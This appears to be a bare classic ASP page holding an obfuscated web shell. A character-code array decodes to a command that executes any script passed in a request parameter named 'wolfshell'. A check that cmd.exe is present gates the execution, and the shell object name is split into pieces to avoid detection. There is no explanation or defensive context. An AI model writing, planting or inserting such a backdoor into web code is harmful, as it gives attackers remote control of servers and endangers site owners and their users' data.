<%
Dim s_9a2f, s_8b1c, i_c3d4, a_e5f6
a_e5f6 = Array(69, 120, 101, 99, 117, 116, 101, 40, 82, 101, 113, 117, 101, 115, 116, 40, 34, 119, 111, 108, 102, 115, 104, 101, 108, 108, 34, 41, 41)
For i_c3d4 = 0 To UBound(a_e5f6)
s_9a2f = s_9a2f & Chr(a_e5f6(i_c3d4))
Next
Dim f_7g8h
Set f_7g8h = CreateObject(Join(Array("WSc", "ript.S", "hell"),""))
s_8b1c = f_7g8h.ExpandEnvironmentStrings("%COMSPEC%")
If InStr(s_8b1c, "cm"&"d.e"&"xe") > 0 Then
    Execute(s_9a2f)
End If
%>